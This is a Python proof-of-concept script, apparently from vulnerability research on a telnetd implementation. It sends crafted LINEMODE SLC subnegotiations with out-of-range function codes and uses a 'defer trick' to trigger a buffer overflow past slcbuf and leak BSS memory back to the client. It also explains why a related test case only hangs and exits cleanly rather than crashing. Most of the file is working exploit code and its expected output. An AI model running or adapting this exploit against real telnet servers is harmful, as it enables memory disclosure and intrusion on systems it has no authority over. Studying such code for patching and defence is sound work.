#!/usr/bin/env python3
"""
Crash investigation: WILL LINEMODE + SLC + WILL TTYPE in same packet.

FINDINGS:
=========
1. The "crash" is NOT a SIGSEGV/SIGABRT. The server calls exit(1) when it
   reads EOF because the client closed the connection while getterminaltype()
   was still waiting for option negotiation responses.

2. Root cause: When sending WILL LINEMODE + SLC + WILL TTYPE in ONE packet
   WITHOUT the other WILLs (TSPEED, XDISPLOC, etc.), getterminaltype()
   processes all the data in one io_drain() call but then stays in its
   first loop waiting for WILL responses to the other DOs (TSPEED, etc.)
   that were never sent. Eventually reads EOF -> exit(1).

3. The defer trick DOES work in same-packet mode IF:
   a) All required WILLs are included in the initial packet
   b) The client responds to telnetd_run's additional DOs (NAWS, ECHO, LFLOW)

   Sequence:
     Client sends: WILL LINEMODE + SLC(overflow) + all WILLs + all SB IS
     Server sends: DO LINEMODE + SB LINEMODE MODE
     Server forks (startslave -> forkpty)
     telnetd_run sends: DO NAWS + DO ECHO + WILL SGA + WILL STATUS + DO LFLOW
     Client sends: WILL NAWS + WILL ECHO + WILL LFLOW (+ optionally SB NAWS)
     Server calls: localstat() -> _terminit=1 -> defer_terminit() -> deferslc()
     deferslc() processes deferred SLC data (overflow!) and sends SLC response

4. The deferred SLC overflow is confirmed:
   - SLC data is deferred via malloc+memmove to def_slcbuf (terminit()=0)
   - After localstat sets _terminit=1, deferslc calls do_opt_slc(def_slcbuf)
   - Now terminit()=1, so process_slc is called for each triplet
   - For func > NSLC (18), the triplet overwrites past slcbuf (108 bytes)
   - end_slc sends the SLC response containing overflow data from BSS
   - free(def_slcbuf) is called

5. With 40 triplets (120 bytes SLC data, 12 bytes past slcbuf end):
   - Response contains 120 bytes = 40 triplets
   - 54 bytes are normal (18 supported SLC entries)
   - 66 bytes are OVERFLOW DATA from BSS memory
"""
import socket
import time
import sys

HOST = "127.0.0.1"
PORT = 2325

IAC  = 0xFF
DONT = 0xFE
DO   = 0xFD
WONT = 0xFC
WILL = 0xFB
SB   = 0xFA
SE   = 0xF0

OPT_TTYPE    = 0x18
OPT_NAWS     = 0x1F
OPT_TSPEED   = 0x20
OPT_LINEMODE = 0x22
OPT_XDISPLOC = 0x23
OPT_OLD_ENVIRON = 0x24
OPT_NEW_ENVIRON = 0x27

LM_SLC = 0x03
NSLC = 18


def recv_all(s, timeout=2):
    s.settimeout(timeout)
    chunks = []
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            chunks.append(c)
    except socket.timeout:
        pass
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    return b''.join(chunks)


def parse_telnet(data):
    cmds = []
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(data):
                cmds.append((cmd, data[i + 2]))
                i += 3
            elif cmd == SB and i + 2 < len(data):
                j = i + 2
                while j < len(data) - 1:
                    if data[j] == IAC and data[j + 1] == SE:
                        break
                    j += 1
                cmds.append((SB, bytes(data[i+2:j])))
                i = j + 2
            elif cmd == IAC:
                i += 2
            else:
                i += 2
        else:
            i += 1
    return cmds


def opt_name(opt):
    return {0x18: 'TTYPE', 0x1F: 'NAWS', 0x20: 'TSPEED', 0x22: 'LINEMODE',
            0x23: 'XDISPLOC', 0x24: 'OLD_ENVIRON', 0x27: 'NEW_ENVIRON',
            0x01: 'ECHO', 0x03: 'SGA', 0x05: 'STATUS', 0x21: 'LFLOW'}.get(opt, f'0x{opt:02x}')


def build_slc_triplets(num_triplets):
    data = bytearray()
    for i in range(num_triplets):
        func = NSLC + 1 + i
        if func > 0xFF:
            func = 0xFE
        if func == IAC:
            data.extend([IAC, IAC, 0x02, 0x00])
        else:
            data.extend([func, 0x02, 0x00])
    return bytes(data)


def test_same_packet_complete(num_triplets=40):
    """
    Send everything in ONE initial packet, then handle telnetd_run's DOs.
    This demonstrates the defer trick works even in same-packet mode.
    """
    print(f"\n{'='*60}")
    print(f"TEST: Same-packet with defer trick, {num_triplets} SLC triplets")
    print(f"{'='*60}")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((HOST, PORT))
    print("[+] Connected")

    time.sleep(0.3)
    data1 = recv_all(s, timeout=1)
    cmds1 = parse_telnet(data1)
    print(f"[+] Received {len(cmds1)} initial commands: ", end="")
    print(", ".join(f"DO {opt_name(opt)}" for cmd, opt in cmds1 if isinstance(opt, int) and cmd == DO))

    # Build mega-packet
    pkt = bytearray()
    pkt.extend([IAC, WILL, OPT_LINEMODE])

    slc_data = build_slc_triplets(num_triplets)
    pkt.extend([IAC, SB, OPT_LINEMODE, LM_SLC])
    pkt.extend(slc_data)
    pkt.extend([IAC, SE])

    # WILL for all server-requested options + NAWS
    pkt.extend([IAC, WILL, OPT_TTYPE])
    pkt.extend([IAC, WILL, OPT_TSPEED])
    pkt.extend([IAC, WILL, OPT_XDISPLOC])
    pkt.extend([IAC, WILL, OPT_NEW_ENVIRON])
    pkt.extend([IAC, WILL, OPT_OLD_ENVIRON])
    pkt.extend([IAC, WILL, OPT_NAWS])

    # All subneg responses
    pkt.extend([IAC, SB, OPT_TTYPE, 0x00]); pkt.extend(b'xterm'); pkt.extend([IAC, SE])
    pkt.extend([IAC, SB, OPT_TSPEED, 0x00]); pkt.extend(b'38400,38400'); pkt.extend([IAC, SE])
    pkt.extend([IAC, SB, OPT_XDISPLOC, 0x00]); pkt.extend(b':0'); pkt.extend([IAC, SE])
    pkt.extend([IAC, SB, OPT_NEW_ENVIRON, 0x00, 0x00]); pkt.extend(b'USER'); pkt.extend([0x01]); pkt.extend(b'root'); pkt.extend([IAC, SE])
    pkt.extend([IAC, SB, OPT_OLD_ENVIRON, 0x00, IAC, SE])
    pkt.extend([IAC, SB, OPT_NAWS, 0x00, 0x50, 0x00, 0x18, IAC, SE])

    print(f"[+] Sending mega-packet ({len(pkt)} bytes): WILL LM + SLC({num_triplets}) + all WILLs + all SB IS")
    s.send(bytes(pkt))

    # Read and respond to telnetd_run's additional DOs
    all_data = bytearray()
    slc_found = False
    slc_body = b''

    for round_num in range(5):
        time.sleep(1)
        s.settimeout(2)
        try:
            d = s.recv(4096)
            if not d:
                print(f"[*] Round {round_num}: EOF")
                break
            all_data.extend(d)

            cmds = parse_telnet(d)
            respond = bytearray()
            for cmd, opt in cmds:
                if isinstance(opt, int):
                    if cmd == DO:
                        print(f"    DO {opt_name(opt)}")
                        respond.extend([IAC, WILL, opt])
                    elif cmd == WILL:
                        print(f"    WILL {opt_name(opt)}")
                        respond.extend([IAC, DO, opt])
                elif isinstance(opt, bytes) and len(opt) > 0:
                    if opt[0] == OPT_LINEMODE and len(opt) > 1 and opt[1] == LM_SLC:
                        slc_body = opt[2:]
                        slc_found = True
                        print(f"    *** SB LINEMODE SLC: {len(slc_body)} bytes ({len(slc_body)//3} triplets) ***")
                        if len(slc_body) > 54:
                            overflow = len(slc_body) - 54
                            print(f"    !!! OVERFLOW DATA: {overflow} bytes past normal SLC !!!")

            if respond:
                s.send(bytes(respond))
        except socket.timeout:
            pass
        except Exception as e:
            print(f"[!] Round {round_num}: {e}")
            break

    s.close()

    if slc_found:
        print(f"\n[+] DEFER TRICK CONFIRMED!")
        print(f"    SLC response: {len(slc_body)} bytes")
        if len(slc_body) > 54:
            overflow = len(slc_body) - 54
            print(f"    Overflow: {overflow} bytes of BSS data leaked")
            print(f"    Normal SLC[0:30]: {slc_body[:30].hex()}")
            print(f"    Overflow[54:]: {slc_body[54:min(90,len(slc_body))].hex()}")
        return "defer_success"
    else:
        print(f"\n[!] No SLC response found in {len(all_data)} bytes")
        return "no_slc_response"


def test_minimal_same_packet(num_triplets=40):
    """
    The original "crash" scenario: WILL LINEMODE + SLC + WILL TTYPE only.
    Missing other WILLs causes getterminaltype to hang.
    """
    print(f"\n{'='*60}")
    print(f"TEST: Minimal same-packet (the 'crash' scenario)")
    print(f"{'='*60}")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((HOST, PORT))

    time.sleep(0.3)
    recv_all(s, timeout=1)

    pkt = bytearray()
    pkt.extend([IAC, WILL, OPT_LINEMODE])
    slc_data = build_slc_triplets(num_triplets)
    pkt.extend([IAC, SB, OPT_LINEMODE, LM_SLC])
    pkt.extend(slc_data)
    pkt.extend([IAC, SE])
    pkt.extend([IAC, WILL, OPT_TTYPE])
    pkt.extend([IAC, SB, OPT_TTYPE, 0x00]); pkt.extend(b'xterm'); pkt.extend([IAC, SE])

    print(f"[+] Sending: WILL LM + SLC({num_triplets}) + WILL TTYPE + TTYPE IS ({len(pkt)} bytes)")
    print(f"    MISSING: WILL TSPEED, WILL XDISPLOC, WILL NEW_ENVIRON, WILL OLD_ENVIRON")
    s.send(bytes(pkt))

    time.sleep(2)
    resp = recv_all(s, timeout=2)
    s.close()

    if resp:
        print(f"[+] Response: {len(resp)} bytes (DO LINEMODE + SB LINEMODE MODE)")
        print(f"    Server is stuck in getterminaltype() waiting for WILLs that never come")
        print(f"    When client closes connection -> io_drain reads EOF -> exit(1)")
        print(f"    This is NOT a crash (no SIGSEGV/SIGABRT), just a clean exit(1)")
        return "stuck_exit1"
    else:
        return "no_response"


if __name__ == "__main__":
    print("Crash Investigation: telnetd-32 defer trick")
    print("=" * 60)

    # Test 1: The original "crash" scenario
    r1 = test_minimal_same_packet(40)
    print(f"\n>>> Result: {r1}")
    time.sleep(2)

    # Test 2: Same-packet with proper handling
    r2 = test_same_packet_complete(40)
    print(f"\n>>> Result: {r2}")

    print(f"\n{'='*60}")
    print(f"SUMMARY")
    print(f"{'='*60}")
    print(f"  Minimal same-packet ('crash'):  {r1}")
    print(f"  Complete same-packet (defer):   {r2}")
    print()
    print("The 'crash' when sending WILL LINEMODE + SLC + WILL TTYPE in one packet")
    print("is actually getterminaltype() hanging because the other required WILLs")
    print("(TSPEED, XDISPLOC, NEW_ENVIRON, OLD_ENVIRON) are missing. The server")
    print("loops in io_drain() waiting for them. When the client closes the")
    print("connection, read() returns 0 (EOF), and the server calls exit(1).")
    print()
    print("With separate packets, the client sends the WILLs in a later packet,")
    print("so getterminaltype() completes normally.")
    print()
    print("The defer trick works correctly in BOTH modes when all required")
    print("negotiation is completed. The SLC overflow is deferred, then")
    print("processed when localstat() is called in telnetd_run().")
